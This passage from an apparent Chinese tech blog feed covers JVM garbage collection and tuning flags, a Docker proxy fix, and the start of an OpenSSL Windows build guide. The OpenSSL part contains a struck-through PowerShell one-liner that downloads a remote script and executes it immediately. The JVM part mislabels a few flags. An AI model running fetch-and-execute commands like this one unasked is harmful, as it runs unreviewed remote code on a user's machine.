来的更加的轻量及可靠。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/c807dab33f8b42329c1910d609e7ed21-new-image565aeab2-6d3e-4c2c-80f6-7a7b0f629fda.png"></p><p>判断一个对象的死亡至少需要两次标记</p><ol><li> 如果对象进行可达性分析之后没发现与 GC Roots 相连的引用链，那它将会第一次标记并且进行一次筛选。判断的条件是决定这个对象是否有必要执行 finalize()方法。如果对象有必要执行 finalize()方法，则被放入 F-Queue 队列中。</li><li> GC 对 F-Queue 队列中的对象进行二次标记。如果对象在 finalize()方法中重新与引用链上的任何一个对象建立了关联，那么二次标记时则会将它移出“即将回收”集合。如果此时对象还没成功逃脱，那么只能被回收了。</li></ol><p>如果确定对象已经死亡，我们又该如何回收这些垃圾呢</p><h3 id="3-4-垃圾回收算法"><a href="#3-4-垃圾回收算法" class="headerlink" title="3.4 垃圾回收算法"></a>3.4 垃圾回收算法</h3><p>不会非常详细的展开，常用的有标记清除，复制，标记整理和分代收集算法</p><h4 id="3-4-1-标记清除算法"><a href="#3-4-1-标记清除算法" class="headerlink" title="3.4.1 标记清除算法"></a>3.4.1 标记清除算法</h4><p>标记清除算法就是分为“标记”和“清除”两个阶段。标记出所有需要回收的对象，标记结束后统一回收。这个套路很简单，也存在不足，后续的算法都是根据这个基础来加以改进的。</p><p>其实它就是把已死亡的对象标记为空闲内存，然后记录在一个空闲列表中，当我们需要 new 一个对象时，内存管理模块会从空闲列表中寻找空闲的内存来分给新的对象。</p><p>不足的方面就是标记和清除的效率比较低下。且这种做法会让内存中的碎片非常多。这个导致了如果我们需要使用到较大的内存块时，无法分配到足够的连续内存。比如下图</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/01605d96d85f4daab9bfa5e7000f0d31-new-image78e03b85-fbef-4df9-b41e-2b63d78d119f.png"></p><p>此时可使用的内存块都是零零散散的，导致了刚刚提到的大内存对象问题</p><h4 id="3-4-2-复制算法"><a href="#3-4-2-复制算法" class="headerlink" title="3.4.2 复制算法"></a>3.4.2 复制算法</h4><p>为了解决效率问题，复制算法就出现了。它将可用内存按容量划分成两等分，每次只使用其中的一块。和 survivor 一样也是用 from 和 to 两个指针这样的玩法。fromPlace 存满了，就把存活的对象 copy 到另一块 toPlace 上，然后交换指针的内容。这样就解决了碎片的问题。</p><p>这个算法的代价就是把内存缩水了，这样堆内存的使用效率就会变得十分低下了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/fc349fbb9b204495a5321febe27818d4-new-image45920a9a-552c-4656-94d6-e3ca45ff9b76.png"></p><p>不过它们分配的时候也不是按照 1:1 这样进行分配的，就类似于 Eden 和 Survivor 也不是等价分配是一个道理。</p><h4 id="3-4-3-标记整理算法"><a href="#3-4-3-标记整理算法" class="headerlink" title="3.4.3 标记整理算法"></a>3.4.3 标记整理算法</h4><p>复制算法在对象存活率高的时候会有一定的效率问题，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉边界以外的内存</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/2599e9f722074d34a3f7fd9f0076f121-new-imagec76192ec-b63a-43e3-a6d6-cf01f749953f.png"></p><h4 id="3-4-4-分代收集算法"><a href="#3-4-4-分代收集算法" class="headerlink" title="3.4.4 分代收集算法"></a>3.4.4 分代收集算法</h4><p>这种算法并没有什么新的思想，只是根据对象存活周期的不同将内存划分为几块。一般是把 Java 堆分为新生代和老年代，这样就可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量存活对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用“标记-清除”或者“标记-整理”算法来进行回收。</p><p>说白了就是八仙过海各显神通，具体问题具体分析了而已。</p><h3 id="3-5-（了解）各种各样的垃圾回收器"><a href="#3-5-（了解）各种各样的垃圾回收器" class="headerlink" title="3.5 （了解）各种各样的垃圾回收器"></a>3.5 （了解）各种各样的垃圾回收器</h3><p>HotSpot VM 中的垃圾回收器，以及适用场景</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/11e9dcd0f1ee4f25836e6f1c47104c51-new-image69e1c56a-1d40-493a-9901-6efc647a01f3.png"></p><p>到 jdk8 为止，默认的垃圾收集器是 Parallel Scavenge 和 Parallel Old</p><p>从 jdk9 开始，G1 收集器成为默认的垃圾收集器<br>目前来看，G1 回收器停顿时间最短而且没有明显缺点，非常适合 Web 应用。在 jdk8 中测试 Web 应用，堆内存 6G，新生代 4.5G 的情况下，Parallel Scavenge 回收新生代停顿长达 1.5 秒。G1 回收器回收同样大小的新生代只停顿 0.2 秒。</p><h3 id="3-6-（了解）JVM-的常用参数"><a href="#3-6-（了解）JVM-的常用参数" class="headerlink" title="3.6 （了解）JVM 的常用参数"></a>3.6 （了解）JVM 的常用参数</h3><p>JVM 的参数非常之多，这里只列举比较重要的几个，通过各种各样的搜索引擎也可以得知这些信息。</p><table><thead><tr><th>参数名称</th><th>含义</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td>-Xms</td><td>初始堆大小</td><td>物理内存的 1/64(&lt;1GB)</td><td>默认(MinHeapFreeRatio 参数可以调整)空余堆内存小于 40%时，JVM 就会增大堆直到-Xmx 的最大限制.</td></tr><tr><td>-Xmx</td><td>最大堆大小</td><td>物理内存的 1/4(&lt;1GB)</td><td>默认(MaxHeapFreeRatio 参数可以调整)空余堆内存大于 70%时，JVM 会减少堆直到 -Xms 的最小限制</td></tr><tr><td>-Xmn</td><td>年轻代大小(1.4or later)</td><td></td><td>注意：此处的大小是（eden+ 2 survivor space).与 jmap -heap 中显示的 New gen 是不同的。整个堆大小=年轻代大小 + 老年代大小 + 持久代（永久代）大小.增大年轻代后,将会减小年老代大小.此值对系统性能影响较大,Sun 官方推荐配置为整个堆的 3/8</td></tr><tr><td>-XX:NewSize</td><td>设置年轻代大小(for 1.3/1.4)</td><td></td><td></td></tr><tr><td>-XX:MaxNewSize</td><td>年轻代最大值(for 1.3/1.4)</td><td></td><td></td></tr><tr><td>-XX:PermSize</td><td>设置持久代(perm gen)初始值</td><td>物理内存的 1/64</td><td></td></tr><tr><td>-XX:MaxPermSize</td><td>设置持久代最大值</td><td>物理内存的 1/4</td><td></td></tr><tr><td>-Xss</td><td>每个线程的堆栈大小</td><td></td><td>JDK5.0 以后每个线程堆栈大小为 1M,以前每个线程堆栈大小为 256K.根据应用的线程所需内存大小进行 调整.在相同物理内存下,减小这个值能生成更多的线程.但是操作系统对一个进程内的线程数还是有限制的,不能无限生成,经验值在 3000~5000 左右一般小的应用， 如果栈不是很深， 应该是 128k 够用的 大的应用建议使用 256k。这个选项对性能影响比较大，需要严格的测试。（校长）和 threadstacksize 选项解释很类似,官方文档似乎没有解释,在论坛中有这样一句话:-Xss is translated in a VM flag named ThreadStackSize”一般设置这个值就可以了</td></tr><tr><td>-XX:NewRatio</td><td>年轻代(包括 Eden 和两个 Survivor 区)与年老代的比值(除去持久代)</td><td></td><td>-XX:NewRatio=4 表示年轻代与年老代所占比值为 1:4,年轻代占整个堆栈的 1/5Xms=Xmx 并且设置了 Xmn 的情况下，该参数不需要进行设置。</td></tr><tr><td>-XX:SurvivorRatio</td><td>Eden 区与 Survivor 区的大小比值</td><td></td><td>设置为 8,则两个 Survivor 区与一个 Eden 区的比值为 2:8,一个 Survivor 区占整个年轻代的 1/10</td></tr><tr><td>-XX:+DisableExplicitGC</td><td>关闭 System.gc()</td><td></td><td>这个参数需要严格的测试</td></tr><tr><td>-XX:PretenureSizeThreshold</td><td>对象超过多大是直接在旧生代分配</td><td>0</td><td>单位字节 新生代采用 Parallel ScavengeGC 时无效另一种直接在旧生代分配的情况是大的数组对象,且数组中无外部引用对象.</td></tr><tr><td>-XX:ParallelGCThreads</td><td>并行收集器的线程数</td><td></td><td>此值最好配置与处理器数目相等 同样适用于 CMS</td></tr><tr><td>-XX:MaxGCPauseMillis</td><td>每次年轻代垃圾回收的最长时间(最大暂停时间)</td><td></td><td>如果无法满足此时间,JVM 会自动调整年轻代大小,以满足此值.</td></tr></tbody></table><p>其实还有一些打印及 CMS 方面的参数，这里就不以一一列举了</p><h2 id="四、关于-JVM-调优的一些方面"><a href="#四、关于-JVM-调优的一些方面" class="headerlink" title="四、关于 JVM 调优的一些方面"></a>四、关于 JVM 调优的一些方面</h2><p>根据刚刚涉及的 jvm 的知识点，我们可以尝试对 JVM 进行调优，主要就是堆内存那块</p><p>所有线程共享数据区大小=新生代大小 + 年老代大小 + 持久代大小。持久代一般固定大小为 64m。所以 java 堆中增大年轻代后，将会减小年老代大小（因为老年代的清理是使用 fullgc，所以老年代过小的话反而是会增多 fullgc 的）。此值对系统性能影响较大，Sun 官方推荐配置为 java 堆的 3/8。</p><h3 id="4-1-调整最大堆内存和最小堆内存"><a href="#4-1-调整最大堆内存和最小堆内存" class="headerlink" title="4.1 调整最大堆内存和最小堆内存"></a>4.1 调整最大堆内存和最小堆内存</h3><p>-Xmx –Xms：指定 java 堆最大值（默认值是物理内存的 1/4(&lt;1GB)）和初始 java 堆最小值（默认值是物理内存的 1/64(&lt;1GB)）</p><p>默认(MinHeapFreeRatio 参数可以调整)空余堆内存小于 40%时，JVM 就会增大堆直到-Xmx 的最大限制.，默认(MaxHeapFreeRatio 参数可以调整)空余堆内存大于 70%时，JVM 会减少堆直到 -Xms 的最小限制。简单点来说，你不停地往堆内存里面丢数据，等它剩余大小小于 40%了，JVM 就会动态申请内存空间不过会小于-Xmx，如果剩余大小大于 70%，又会动态缩小不过不会小于–Xms。就这么简单</p><p>开发过程中，通常会将 -Xms 与 -Xmx 两个参数配置成相同的值，其目的是为了能够在 java 垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小而浪费资源。</p><p>我们执行下面的代码</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Xmx="</span> + Runtime.getRuntime().maxMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);    <span class="comment">//系统的最大空间</span></span><br><span class="line">System.out.println(<span class="string">"free mem="</span> + Runtime.getRuntime().freeMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的空闲空间</span></span><br><span class="line">System.out.println(<span class="string">"total mem="</span> + Runtime.getRuntime().totalMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//当前可用的总空间</span></span><br></pre></td></tr></tbody></table></figure><p>注意：此处设置的是 Java 堆大小，也就是新生代大小 + 老年代大小</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/5e7b352c16d74c789c665af46d3a2509-new-imagedd645dae-307d-4572-b6e2-b5a9925a46cd.png"></p><p>设置一个 VM options 的参数</p><pre><code>-Xmx20m -Xms5m -XX:+PrintGCDetails</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/fe99e355f4754fa4be7427cb65261f3d-new-imagebb5cf485-99f8-43eb-8809-2a89e6a1768e.png"></p><p>再次启动 main 方法</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/300539f6560043dd8a3fe085d28420e6-new-image3c581a2e-196f-4b01-90f1-c27731b4610b.png"></p><p>这里 GC 弹出了一个 Allocation Failure 分配失败，这个事情发生在 PSYoungGen，也就是年轻代中</p><p>这时候申请到的内存为 18M，空闲内存为 4.214195251464844M</p><p>我们此时创建一个字节数组看看，执行下面的代码</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">System.out.println(<span class="string">"分配了1M空间给数组"</span>);</span><br><span class="line">System.out.println(<span class="string">"Xmx="</span> + Runtime.getRuntime().maxMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的最大空间</span></span><br><span class="line">System.out.println(<span class="string">"free mem="</span> + Runtime.getRuntime().freeMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的空闲空间</span></span><br><span class="line">System.out.println(<span class="string">"total mem="</span> + Runtime.getRuntime().totalMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/bdd717d0a3394be7a733760052773374-new-image371b5d59-0020-4091-9874-603c0ab0073d.png"></p><p>此时 free memory 就又缩水了，不过 total memory 是没有变化的。Java 会尽可能将 total mem 的值维持在最小堆内存大小</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">System.out.println(<span class="string">"分配了10M空间给数组"</span>);</span><br><span class="line">System.out.println(<span class="string">"Xmx="</span> + Runtime.getRuntime().maxMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的最大空间</span></span><br><span class="line">System.out.println(<span class="string">"free mem="</span> + Runtime.getRuntime().freeMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的空闲空间</span></span><br><span class="line">System.out.println(<span class="string">"total mem="</span> + Runtime.getRuntime().totalMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//当前可用的总空间</span></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/0fd7550ae2144adca8ed2ede12d5fb96-new-image0c31ff20-289d-4088-8c67-a846d0c5d1e0.png"></p><p>这时候我们创建了一个 10M 的字节数据，这时候最小堆内存是顶不住的。我们会发现现在的 total memory 已经变成了 15M，这就是已经申请了一次内存的结果。</p><p>此时我们再跑一下这个代码</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.gc();</span><br><span class="line">System.out.println(<span class="string">"Xmx="</span> + Runtime.getRuntime().maxMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);    <span class="comment">//系统的最大空间</span></span><br><span class="line">System.out.println(<span class="string">"free mem="</span> + Runtime.getRuntime().freeMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//系统的空闲空间</span></span><br><span class="line">System.out.println(<span class="string">"total mem="</span> + Runtime.getRuntime().totalMemory() / <span class="number">1024.0</span> / <span class="number">1024</span> + <span class="string">"M"</span>);  <span class="comment">//当前可用的总空间</span></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/4cc44b5d5d1c40c48640ece6a296b1ac-new-image4b57baf6-085b-4150-9c60-ac51b0f815d7.png"></p><p>此时我们手动执行了一次 fullgc，此时 total memory 的内存空间又变回 5.5M 了，此时又是把申请的内存释放掉的结果。</p><h3 id="4-2-调整新生代和老年代的比值"><a href="#4-2-调整新生代和老年代的比值" class="headerlink" title="4.2 调整新生代和老年代的比值"></a>4.2 调整新生代和老年代的比值</h3><p>-XX:NewRatio — 新生代（eden+2*Survivor）和老年代（不包含永久区）的比值</p><p>例如：-XX:NewRatio=4，表示新生代:老年代=1:4，即新生代占整个堆的 1/5。在 Xms=Xmx 并且设置了 Xmn 的情况下，该参数不需要进行设置。</p><h3 id="4-3-调整-Survivor-区和-Eden-区的比值"><a href="#4-3-调整-Survivor-区和-Eden-区的比值" class="headerlink" title="4.3 调整 Survivor 区和 Eden 区的比值"></a>4.3 调整 Survivor 区和 Eden 区的比值</h3><p>-XX:SurvivorRatio（幸存代）— 设置两个 Survivor 区和 eden 的比值</p><p>例如：8，表示两个 Survivor:eden=2:8，即一个 Survivor 占年轻代的 1/10</p><h3 id="4-4-设置年轻代和老年代的大小"><a href="#4-4-设置年轻代和老年代的大小" class="headerlink" title="4.4 设置年轻代和老年代的大小"></a>4.4 设置年轻代和老年代的大小</h3><p>-XX:NewSize — 设置年轻代大小</p><p>-XX:MaxNewSize — 设置年轻代最大值</p><p>可以通过设置不同参数来测试不同的情况，反正最优解当然就是官方的 Eden 和 Survivor 的占比为 8:1:1，然后在刚刚介绍这些参数的时候都已经附带了一些说明，感兴趣的也可以看看。反正最大堆内存和最小堆内存如果数值不同会导致多次的 gc，需要注意。</p><h3 id="4-5-小总结"><a href="#4-5-小总结" class="headerlink" title="4.5 小总结"></a>4.5 小总结</h3><p>根据实际事情调整新生代和幸存代的大小，官方推荐新生代占 java 堆的 3/8，幸存代占新生代的 1/10</p><p>在 OOM 时，记得 Dump 出堆，确保可以排查现场问题，通过下面命令你可以输出一个.dump 文件，这个文件可以使用 VisualVM 或者 Java 自带的 Java VisualVM 工具。</p><pre><code>-Xmx20m -Xms5m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=你要输出的日志路径</code></pre><p>一般我们也可以通过编写脚本的方式来让 OOM 出现时给我们报个信，可以通过发送邮件或者重启程序等来解决。</p><h3 id="4-6-永久区的设置"><a href="#4-6-永久区的设置" class="headerlink" title="4.6 永久区的设置"></a>4.6 永久区的设置</h3><pre><code>-XX:PermSize -XX:MaxPermSize</code></pre><p>初始空间（默认为物理内存的 1/64）和最大空间（默认为物理内存的 1/4）。也就是说，jvm 启动时，永久区一开始就占用了 PermSize 大小的空间，如果空间还不够，可以继续扩展，但是不能超过 MaxPermSize，否则会 OOM。</p><p>tips：如果堆空间没有用完也抛出了 OOM，有可能是永久区导致的。堆空间实际占用非常少，但是永久区溢出 一样抛出 OOM。</p><h3 id="4-7-JVM-的栈参数调优"><a href="#4-7-JVM-的栈参数调优" class="headerlink" title="4.7 JVM 的栈参数调优"></a>4.7 JVM 的栈参数调优</h3><h4 id="4-7-1-调整每个线程栈空间的大小"><a href="#4-7-1-调整每个线程栈空间的大小" class="headerlink" title="4.7.1 调整每个线程栈空间的大小"></a>4.7.1 调整每个线程栈空间的大小</h4><p>可以通过-Xss：调整每个线程栈空间的大小</p><p>JDK5.0 以后每个线程堆栈大小为 1M，以前每个线程堆栈大小为 256K。在相同物理内存下,减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在 3000~5000 左右</p><h4 id="4-7-2-设置线程栈的大小"><a href="#4-7-2-设置线程栈的大小" class="headerlink" title="4.7.2 设置线程栈的大小"></a>4.7.2 设置线程栈的大小</h4><pre><code>-XXThreadStackSize：    设置线程栈的大小(0 means use default stack size)</code></pre><p>这些参数都是可以通过自己编写程序去简单测试的，这里碍于篇幅问题就不再提供 demo 了</p><h3 id="4-8-可以直接跳过了-JVM-其他参数介绍"><a href="#4-8-可以直接跳过了-JVM-其他参数介绍" class="headerlink" title="4.8 (可以直接跳过了)JVM 其他参数介绍"></a>4.8 (可以直接跳过了)JVM 其他参数介绍</h3><p>形形色色的参数很多，就不会说把所有都扯个遍了，因为大家其实也不会说一定要去深究到底。</p><h4 id="4-8-1-设置内存页的大小"><a href="#4-8-1-设置内存页的大小" class="headerlink" title="4.8.1 设置内存页的大小"></a>4.8.1 设置内存页的大小</h4><pre><code>-XXThreadStackSize：    设置内存页的大小，不可设置过大，会影响Perm的大小</code></pre><h4 id="4-8-2-设置原始类型的快速优化"><a href="#4-8-2-设置原始类型的快速优化" class="headerlink" title="4.8.2 设置原始类型的快速优化"></a>4.8.2 设置原始类型的快速优化</h4><pre><code>-XX:+UseFastAccessorMethods：    设置原始类型的快速优化</code></pre><h4 id="4-8-3-设置关闭手动-GC"><a href="#4-8-3-设置关闭手动-GC" class="headerlink" title="4.8.3 设置关闭手动 GC"></a>4.8.3 设置关闭手动 GC</h4><pre><code>-XX:+DisableExplicitGC：    设置关闭System.gc()(这个参数需要严格的测试)</code></pre><h4 id="4-8-4-设置垃圾最大年龄"><a href="#4-8-4-设置垃圾最大年龄" class="headerlink" title="4.8.4 设置垃圾最大年龄"></a>4.8.4 设置垃圾最大年龄</h4><pre><code>-XX:MaxTenuringThreshold    设置垃圾最大年龄。如果设置为0的话,则年轻代对象不经过Survivor区,直接进入年老代.    对于年老代比较多的应用,可以提高效率。如果将此值设置为一个较大值,    则年轻代对象会在Survivor区进行多次复制,这样可以增加对象再年轻代的存活时间,    增加在年轻代即被回收的概率。该参数只有在串行GC时才有效.</code></pre><h4 id="4-8-5-加快编译速度"><a href="#4-8-5-加快编译速度" class="headerlink" title="4.8.5 加快编译速度"></a>4.8.5 加快编译速度</h4><pre><code>-XX:+AggressiveOpts</code></pre><p>加快编译速度</p><h4 id="4-8-6-改善锁机制性能"><a href="#4-8-6-改善锁机制性能" class="headerlink" title="4.8.6 改善锁机制性能"></a>4.8.6 改善锁机制性能</h4><pre><code>-XX:+UseBiasedLocking</code></pre><h4 id="4-8-7-禁用垃圾回收"><a href="#4-8-7-禁用垃圾回收" class="headerlink" title="4.8.7 禁用垃圾回收"></a>4.8.7 禁用垃圾回收</h4><pre><code>-Xnoclassgc</code></pre><h4 id="4-8-8-设置堆空间存活时间"><a href="#4-8-8-设置堆空间存活时间" class="headerlink" title="4.8.8 设置堆空间存活时间"></a>4.8.8 设置堆空间存活时间</h4><pre><code>-XX:SoftRefLRUPolicyMSPerMB    设置每兆堆空闲空间中SoftReference的存活时间，默认值是1s。</code></pre><h4 id="4-8-9-设置对象直接分配在老年代"><a href="#4-8-9-设置对象直接分配在老年代" class="headerlink" title="4.8.9 设置对象直接分配在老年代"></a>4.8.9 设置对象直接分配在老年代</h4><pre><code>-XX:PretenureSizeThreshold    设置对象超过多大时直接在老年代分配，默认值是0。</code></pre><h4 id="4-8-10-设置-TLAB-占-eden-区的比例"><a href="#4-8-10-设置-TLAB-占-eden-区的比例" class="headerlink" title="4.8.10 设置 TLAB 占 eden 区的比例"></a>4.8.10 设置 TLAB 占 eden 区的比例</h4><pre><code>-XX:TLABWasteTargetPercent    设置TLAB占eden区的百分比，默认值是1% 。</code></pre><h4 id="4-8-11-设置是否优先-YGC"><a href="#4-8-11-设置是否优先-YGC" class="headerlink" title="4.8.11 设置是否优先 YGC"></a>4.8.11 设置是否优先 YGC</h4><pre><code>-XX:+CollectGen0First    设置FullGC时是否先YGC，默认值是false。</code></pre><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>真的扯了很久这东西，参考了多方的资料，有极客时间的《深入拆解虚拟机》和《Java 核心技术面试精讲》，也有百度，也有自己在学习的一些线上课程的总结。希望对你有所帮助，谢谢。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试文章</title>
      <link href="/posts/103/"/>
      <url>/posts/103/</url>
      
        <content type="html"><![CDATA[<p>大家好！</p><p>我很高兴在这个美妙的虚空之字的博客世界里与大家相遇。这是我写博客的开端，也是我开始探索代码艺术之旅的起点。</p><p>代码，对我而言，不仅仅是冰冷的指令和函数的堆砌。它们如同音符，在我的手指间奏响优美的旋律。通过编码，我可以创造出令人惊叹的应用程序、网站和工具，将想法变为现实。</p><p>在这个博客中，我将分享我对代码的热爱和探索，以及与之相关的艺术与创造力。我会探讨编程的美妙之处，探索代码中隐藏的诗意，并分享我的创作心得和技巧。</p><p>我希望这个博客能成为一个交流和学习的平台，让我们共同探索代码艺术的无限可能。我鼓励大家在评论区留下你们的想法、问题和建议。我期待与你们的互动，共同成长。</p><p>让我们开始这个令人兴奋的旅程吧！感谢你们的支持和关注。</p><p>愿代码之旅带给我们无尽的创造和惊喜！</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker in Mac在IDEA上无法连接</title>
      <link href="/posts/1231995594/"/>
      <url>/posts/1231995594/</url>
      
        <content type="html"><![CDATA[<p>错误信息：Connot connect: java.io.IOException: unexpected end of stream on <a href="http://docker.socket/">http://docker.socket/</a>…</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1231995594/image-20220318185243753.png" alt="image-20220318185243753"></p><p>在某代理软件里确实显示这个链接通过了代理</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1231995594/image-20220318185254826.png" alt="image-20220318185254826"></p><p>加上例外后轻松解决：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1231995594/image-20220318185431230.png" alt="image-20220318185431230"></p>]]></content>
      
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSL在Windows和Linux下的编译</title>
      <link href="/posts/33090/"/>
      <url>/posts/33090/</url>
      
        <content type="html"><![CDATA[<p>具体参见<a href="https://wiki.openssl.org/index.php/Compilation_and_Installation">https://wiki.openssl.org/index.php/Compilation_and_Installation</a></p><h2 id="Windows下的编译"><a href="#Windows下的编译" class="headerlink" title="Windows下的编译"></a>Windows下的编译</h2><p>第一步：下载ActivePerl （<a href="https://www.activestate.com/products/perl/">https://www.activestate.com/products/perl/</a>） ，安装ActivePerl，默认安装路径在C:\Perl64。打开命令提示符，定位到 C:\Perl64\eg 目录，执行 perl example.pl，若提示 Hello from ActivePerl! 则说明 Perl 安装成功。（注意： 这里只能下载64位系统安装的版本）</p><p><del>注：可能报错“Can’t locate Win32/Console.pm”这里可以下载我编译好的版本<br><a href="https://platform.activestate.com/DonaldXY/ActivePerl-5.26/distributions">https://platform.activestate.com/DonaldXY/ActivePerl-5.26/distributions</a></del></p><p><del><strong>或者直接在cmd执行以下代码</strong></del></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command "&amp; $([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://platform.activestate.com/dl/cli/_pdli01/install-latest.ps1'))) -c'state activate --default DonaldXY/ActivePerl-5.26'"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>第二步：下载并安装 nasm汇编器（<a href="http://www.nasm.us/%EF%BC%8C">http://www.nasm.us/，</a> ），默认安装在C:\Users\lenovo\AppData\Local\bin\NASM，将此路径加入Path环境变量，这个可以下载32位或者64位都没所谓</p><p>第三步 执行perl Configure VC-WIN32 –prefix=c:\openssl\win32，prefix参数指的是后面执行nmake install命令把OpenSSL安装到哪个目录。</p><p>64位 编译 就改成VC-WIN64A 静态编译加no-shared</p><p>如:perl Configure no-shared VC-WIN64A –prefix=c:\openssl\win32</p><p>第四步：编译 (使用VS2019 的命令行，64位要使用64位的)</p><p>nmake</p><p>nmake test</p><p>nmake install</p><p><strong>重新编译需要执行清理</strong></p><p>nmake clean</p><p>很多博客编译OPENSSL 的方法在1.1.0以后的版本都不行，具体出现的问题是</p><p>It looks like you don’t have either nmake.exe or dmake.exe on your PATH, so you will not be able to execute the commands from a Makefile. You can install dmake.exe with the Perl Package Manager by running: ppm install dmake</p><p>下面才是老版本和新版本不同的编译办法</p><p>都是打开VS自己的命令行，不要打开WINDOWS的命令行</p><p>老版本（1.1.0以前的版本是）是</p><p>执行ms\do_nasm</p><p>执行nmake -f ms\ntdll.mak，此处大约需要几分钟，如果一切正常，会在out32dll目录下生成很多dll和exe文件。</p><p>执行nmake -f ms\ntdll.mak 